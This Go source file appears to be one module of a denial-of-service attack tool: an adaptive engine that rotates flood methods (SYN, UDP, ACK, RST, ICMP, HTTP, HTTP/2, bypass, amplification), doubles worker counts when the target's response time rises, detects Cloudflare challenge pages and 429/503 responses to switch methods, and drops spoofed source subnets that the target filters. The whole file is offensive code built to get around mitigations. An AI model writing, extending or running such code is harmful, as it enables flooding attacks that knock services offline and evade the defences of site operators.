package main

import (
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

type AttackStats struct {
	Method     string
	Sent       int64
	Errors     int64
	Latency    time.Duration
	LastActive time.Time
	Score      float64
}

type subnetStats struct {
	sent    int64
	dropped int64
	loss    float64
}

type AdaptiveEngine struct {
	cfg           *AttackConfig
	done          chan struct{}
	stats         map[string]*AttackStats
	mu            sync.RWMutex
	currentMethod string
	rttBaseline   time.Duration
	rttEscalated  bool
	methods       []string
	methodIndex   int
	blockedFlg    bool
	subnetStats   map[string]*subnetStats
	conntrackFull bool
	whitelist     []string
	blacklist     []string
}

func NewAdaptiveEngine(cfg *AttackConfig, done chan struct{}) *AdaptiveEngine {
	methods := []string{"syn", "udp", "ack", "rst", "icmp", "http", "h2", "bypass", "amp"}
	if len(cfg.MethodList) > 0 {
		methods = cfg.MethodList
	}
	ae := &AdaptiveEngine{cfg: cfg, done: done, stats: make(map[string]*AttackStats), methods: methods, subnetStats: make(map[string]*subnetStats)}
	for _, m := range methods {
		ae.stats[m] = &AttackStats{Method: m, Score: 1.0}
	}
	return ae
}

func (ae *AdaptiveEngine) RunRTTMonitor(attackRunning func() bool) {
	targetStr := ae.cfg.Target
	addr := net.JoinHostPort(targetStr, "80")
	for {
		select {
		case <-ae.done:
			return
		default:
		}
		if !attackRunning() {
			time.Sleep(1 * time.Second)
			continue
		}
		t0 := time.Now()
		conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
		if err != nil {
			time.Sleep(1 * time.Second)
			continue
		}
		conn.Close()
		rtt := time.Since(t0)
		ae.mu.Lock()
		if ae.rttBaseline == 0 {
			ae.rttBaseline = rtt
		} else if rtt > ae.rttBaseline*2 && !ae.rttEscalated {
			ae.rttEscalated = true
			ae.cfg.Workers *= 2
			if ae.cfg.Workers > 4096 {
				ae.cfg.Workers = 4096
			}
		} else if rtt < ae.rttBaseline*12 && ae.rttEscalated {
			ae.blockedFlg = true
			ae.currentMethod = ae.nextMethod()
		}
		ae.mu.Unlock()
		time.Sleep(1 * time.Second)
	}
}

func (ae *AdaptiveEngine) CheckWAFBlocked(statusCode int, body string) bool {
	if statusCode == 503 || statusCode == 429 {
		ae.blockedFlg = true
		return true
	}
	if strings.Contains(body, "cf-browser-verification") ||
		strings.Contains(body, "just a moment") ||
		strings.Contains(body, "challenge") {
		ae.blockedFlg = true
		return true
	}
	return false
}

func (ae *AdaptiveEngine) nextMethod() string {
	ae.mu.Lock()
	defer ae.mu.Unlock()
	best := ""
	bestScore := -1.0
	for m, s := range ae.stats {
		if m != ae.currentMethod && s.Score > bestScore {
			bestScore = s.Score
			best = m
		}
	}
	if best == "" {
		ae.methodIndex = (ae.methodIndex + 1) % len(ae.methods)
		best = ae.methods[ae.methodIndex]
	}
	ae.currentMethod = best
	return best
}

func (ae *AdaptiveEngine) RecordResult(method string, success bool, latency time.Duration) {
	ae.mu.Lock()
	defer ae.mu.Unlock()
	s, ok := ae.stats[method]
	if !ok {
		s = &AttackStats{Method: method}
		ae.stats[method] = s
	}
	if success {
		s.Score += 0.05
	} else {
		s.Score -= 0.1
	}
	if s.Score < 0 {
		s.Score = 0
	}
	if s.Score > 10 {
		s.Score = 10
	}
	s.Latency = latency
	s.LastActive = time.Now()
}

/* ─── Connection table exhaustion detection ─── */

func (ae *AdaptiveEngine) RunConntrackMonitor() {
	for {
		select {
		case <-ae.done:
			return
		default:
		}
		full, ratio := checkConntrackFull()
		ae.mu.Lock()
		ae.conntrackFull = full
		ae.mu.Unlock()
		if full {
			warnf(`{"type":"conntrack","status":"full","ratio":%.2f}`+"\n", ratio)
		}
		time.Sleep(2 * time.Second)
	}
}

func checkConntrackFull() (bool, float64) {
	count, max := 0, 0
	n, _ := readIntFromFile("/proc/sys/net/netfilter/nf_conntrack_count")
	m, _ := readIntFromFile("/proc/sys/net/netfilter/nf_conntrack_max")
	if m > 0 {
		count = n
		max = m
		ratio := float64(count) / float64(max)
		return ratio > 0.95, ratio
	}
	return false, 0
}

func readIntFromFile(path string) (int, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return 0, err
	}
	var v int
	fmt.Sscanf(strings.TrimSpace(string(data)), "%d", &v)
	return v, nil
}

/* ─── IP subnet blacklist evasion ─── */

func (ae *AdaptiveEngine) RecordSubnetResult(spoofIP string, success bool) {
	parts := strings.Split(spoofIP, ".")
	if len(parts) < 3 { return }
	subnet := parts[0] + "." + parts[1] + "." + parts[2]

	ae.mu.Lock()
	defer ae.mu.Unlock()
	ss, ok := ae.subnetStats[subnet]
	if !ok {
		ss = &subnetStats{}
		ae.subnetStats[subnet] = ss
	}
	ss.sent++
	if !success {
		ss.dropped++
	}
	ss.loss = float64(ss.dropped) / float64(ss.sent+1)

	/* Blacklist subnet if loss > 90% */
	if ss.loss > 0.9 && len(ae.blacklist) < 1000 {
		blacklisted := false
		for _, b := range ae.blacklist {
			if b == subnet {
				blacklisted = true
				break
			}
		}
		if !blacklisted {
			ae.blacklist = append(ae.blacklist, subnet)
			warnf(`{"type":"blacklist","subnet":"%s.0/24","loss":%.2f}`+"\n", subnet, ss.loss)
		}
	}
}

func (ae *AdaptiveEngine) IsSubnetBlacklisted(spoofIP string) bool {
	parts := strings.Split(spoofIP, ".")
	if len(parts) < 3 { return false }
	subnet := parts[0] + "." + parts[1] + "." + parts[2]
	ae.mu.RLock()
	defer ae.mu.RUnlock()
	for _, b := range ae.blacklist {
		if b == subnet {
			return true
		}
	}
	return false
}

func (ae *AdaptiveEngine) IsConntrackFull() bool {
	ae.mu.RLock()
	defer ae.mu.RUnlock()
	return ae.conntrackFull
}

func (ae *AdaptiveEngine) FilterSpoofPool(pool []string) []string {
	if len(ae.blacklist) == 0 {
		return pool
	}
	filtered := make([]string, 0, len(pool))
	for _, ip := range pool {
		if !ae.IsSubnetBlacklisted(ip) {
			filtered = append(filtered, ip)
		}
	}
	if len(filtered) < 10 {
		return pool
	}
	return filtered
}
